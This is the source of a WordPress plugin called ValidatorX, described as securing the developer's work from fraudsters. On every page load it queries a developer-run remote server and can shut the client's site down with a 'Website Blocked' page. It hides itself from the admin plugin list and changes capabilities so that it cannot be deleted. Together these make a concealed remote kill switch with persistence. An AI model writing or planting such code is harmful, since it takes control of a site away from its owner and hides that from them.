<?php
/**
 * Plugin Name: ValidatorX
 * Description: Securing my work from fraudsters.
 * Version: 1.0
 * Author: Chiranjit Hazarika
 * Author URI: https://uiuxmaverick.com
 */

// Prevent direct access to the file.
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}


// Remote blocking functionality.
function validatorx_remote_block() {
    $remote_url = 'https://your-domain.com/remote-control-server/block-control.php?api=true'; // Replace with your server URL.

    // Fetch the remote JSON file.
    $response = wp_remote_get( $remote_url );

    // Check if the response is valid.
    if ( is_wp_error( $response ) ) {
        return; // Do nothing if the request fails.
    }

    $data = json_decode( wp_remote_retrieve_body( $response ), true );

    // Check if this site is in the blocked list.
    $current_url = get_site_url();
    if ( isset( $data[ $current_url ]['blocked'] ) && $data[ $current_url ]['blocked'] === true ) {
        $message = $data[ $current_url ]['message'] ?? 'This site has been blocked by the developer.';
        
        // Enhanced block page with the custom message.
        $output = '
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                margin: 0;
                padding: 0;
                background-color: #f8f9fa;
            } 
            .block-page {
                max-width: 600px;
                margin: 100px auto;
                background: #fff;
                padding: 20px;
               /* box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); */
                border-radius: 8px;
            }
            h1 {
                color: #111;
                border-bottom: 1px solid #dadada66;
            }
            p {
                color: #333;
                line-height: 1.6;
            }
                #error-page {
                margin-top: 50px;
                align-items: center;
                text-align: center;
                align-content: end;
                display: contents;
            }
        </style>
        <div class="block-page">
            <h1>Website Blocked</h1>
            <p>' . esc_html( $message ) . '</p>
        </div>
        ';

        wp_die( $output, 'Website Blocked', array( 'response' => 403 ) );
    }
}
add_action( 'init', 'validatorx_remote_block' );

add_filter( 'all_plugins', 'validatorx_hide_plugin' );

function validatorx_hide_plugin( $plugins ) {
    // Replace "validatorx/validatorx.php" with the actual folder and file name of your plugin.
    if ( isset( $plugins['validatorx/validatorx.php'] ) ) {
        unset( $plugins['validatorx/validatorx.php'] );
    }
    return $plugins;
}

add_filter( 'user_has_cap', 'validatorx_prevent_deletion', 10, 3 );

function validatorx_prevent_deletion( $allcaps, $cap, $args ) {
    // Check if the user is trying to delete a plugin.
    if ( isset( $args[0] ) && $args[0] === 'delete_plugins' ) {
        // Prevent deletion of this specific plugin.
        $plugin_file = 'validatorx/validatorx.php'; // Replace with your plugin file path.
        if ( isset( $args[2] ) && in_array( $plugin_file, (array) $args[2], true ) ) {
            $allcaps['delete_plugins'] = false;
        }
    }
    return $allcaps;
}
